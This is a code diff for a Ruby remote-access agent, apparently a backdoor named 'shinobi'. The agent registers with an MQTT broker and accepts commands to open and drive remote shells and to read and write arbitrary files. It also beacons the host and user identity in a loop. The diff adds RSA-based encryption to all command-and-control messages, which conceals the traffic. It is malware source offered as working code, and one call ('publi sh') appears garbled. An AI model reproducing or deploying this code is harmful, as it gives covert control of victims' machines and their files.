@@ -5,15 +5,31 @@ require 'securerandom'
 require 'os'
 require 'json'
 
+require_relative 'core/encryption'
+require_relative 'core/serialization'
+
 require_relative 'inators/remoteshell'
 require_relative 'inators/filerw'
-require_relative 'helpers'
+
+#test
+key = OpenSSL::PKey::RSA.new(2408)
+pub_key = key.public_key.to_pem
+#test
+
+Encryption.config({
+	:bu_key => pub_key
+})
+
+Serialization.config({
+
+})
 
 shinobi = {
 	:id => SecureRandom.hex(2),
 	:host => (OS.windows? ? `ver` : `uname -sr`).strip,
 	:user => OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip,
-	:status => :offline
+	:status => :offline,
+	:public_key => Encryption.public_key
 }
 
 mqtt_topics = {
@@ -58,27 +74,32 @@ mqtt_client.on_connack do
 end
 
 mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_open]) do |packet|
-	packet = Serialization.deserialize(packet.payload)
+	packet = Encryption.decrypt(packet.payload)
+	packet = Serialization.deserialize(packet)
 	remoteshell_inator.open(packet.shell)
 end
 
 mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_close]) do |packet|
-	packet = Serialization.deserialize(packet.payload)
+	packet = Encryption.decrypt(packet.payload)
+	packet = Serialization.deserialize(packet)
 	remoteshell_inator.close(packet.pid)
 end
 
 mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_write]) do |packet|
-	packet = Serialization.deserialize(packet.payload)
+	packet = Encryption.decrypt(packet.payload)
+	packet = Serialization.deserialize(packet)
 	remoteshell_inator.write(packet.pid, packet.data)
 end
 
 mqtt_client.add_topic_callback(mqtt_topics[:filerw_read]) do |packet|
-	packet = Serialization.deserialize(packet.payload)
+	packet = Encryption.decrypt(packet.payload)
+	packet = Serialization.deserialize(packet)
 	filerw_inator.read(packet.file, packet.length, packet.offset)
 end
 
 mqtt_client.add_topic_callback(mqtt_topics[:filerw_write]) do |packet|
-	packet = Serialization.deserialize(packet.payload)
+	packet = Encryption.decrypt(packet.payload)
+	packet = Serialization.deserialize(packet)
 	filerw_inator.write(packet.file, packet.data, packet.offset)
 end
 
@@ -87,7 +108,9 @@ remoteshell_inator.on :open do |pid, shell|
 		pid: pid,
 		shell: shell
 	}
-	mqtt_client.publish(mqtt_topics[:remoteshell_onopen], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publish(mqtt_topics[:remoteshell_onopen], packet, false, 1)
 	remote_shells = []
 	remoteshell_inator.remote_shells.each do |remote_shell|
 		remote_shells << { :pid => remote_shell[2].pid, :shell => remote_shell[4] }
@@ -95,14 +118,18 @@ remoteshell_inator.on :open do |pid, shell|
 	packet = {
 		remote_shells: remote_shells
 	}
-	mqtt_client.publish(mqtt_topics[:remoteshell], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publish(mqtt_topics[:remoteshell], packet, false, 1)
 end
 
 remoteshell_inator.on :close do |pid|
 	packet = {
 		pid: pid
 	}
-	mqtt_client.publish(mqtt_topics[:remoteshell_onclose], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publish(mqtt_topics[:remoteshell_onclose], packet, false, 1)
 	remote_shells = []
 	remoteshell_inator.remote_shells.each do |remote_shell|
 		remote_shells << { :pid => remote_shell[2].pid, :shell => remote_shell[4] }
@@ -110,7 +137,9 @@ remoteshell_inator.on :close do |pid|
 	packet = {
 		remote_shells: remote_shells
 	}
-	mqtt_client.publish(mqtt_topics[:remoteshell], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publish(mqtt_topics[:remoteshell], packet, false, 1)
 end
 
 remoteshell_inator.on :read do |pid, data|
@@ -118,7 +147,9 @@ remoteshell_inator.on :read do |pid, data|
 		pid: pid,
 		data: data
 	}
-	mqtt_client.publish(mqtt_topics[:remoteshell_onread], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publish(mqtt_topics[:remoteshell_onread], packet, false, 1)
 end
 
 remoteshell_inator.on :write do |pid, data|
@@ -126,7 +157,9 @@ remoteshell_inator.on :write do |pid, data|
 		pid: pid,
 		data: data
 	}
-	mqtt_client.publish(mqtt_topics[:remoteshell_onwrite], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publish(mqtt_topics[:remoteshell_onwrite], packet, false, 1)
 end
 
 remoteshell_inator.on :error do |pid, error|
@@ -134,7 +167,9 @@ remoteshell_inator.on :error do |pid, error|
 		pid: pid,
 		error: error
 	}
-	mqtt_client.publish(mqtt_topics[:remoteshell_onerror], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publish(mqtt_topics[:remoteshell_onerror], packet, false, 1)
 end
 
 filerw_inator.on :read do |file, length, offset, data|
@@ -144,7 +179,9 @@ filerw_inator.on :read do |file, length, offset, data|
 		offset: offset,
 		data: data
 	}
-	mqtt_client.publish(mqtt_topics[:filerw_onread], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publish(mqtt_topics[:filerw_onread], packet, false, 1)
 end
 
 filerw_inator.on :write do |file, data, offset, length|
@@ -153,7 +190,9 @@ filerw_inator.on :write do |file, data, offset, length|
 		offset: offset,
 		length: length
 	}
-	mqtt_client.publish(mqtt_topics[:filerw_onwrite], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publish(mqtt_topics[:filerw_onwrite], packet, false, 1)
 end
 
 filerw_inator.on :error do |file, error|
@@ -161,7 +200,9 @@ filerw_inator.on :error do |file, error|
 		file: file,
 		error: error
 	}
-	mqtt_client.publi sh(mqtt_topics[:filerw_onerror], Serialization.serialize(packet), false, 1)
+	packet = Serialization.serialize(packet)
+	packet = Encryption.encrypt(packet)
+	mqtt_client.publi sh(mqtt_topics[:filerw_onerror], packet, false, 1)
 end
 
 mqtt_client.connect(mqtt_client.host, mqtt_client.port, mqtt_client.keep_alive, mqtt_client.persistent, mqtt_client.blocking)
@@ -174,7 +215,9 @@ end
 
 Thread.new do
 	loop do
-		mqtt_client.publish(mqtt_topics[:shinobi], Serialization.serialize(shinobi), false, 1)
+		packet = Serialization.serialize(shinobi)
+		packet = Encryption.encrypt(packet)
+		mqtt_client.publish(mqtt_topics[:shinobi], packet, false, 1)
 		sleep mqtt_client.keep_alive
 	end
 end
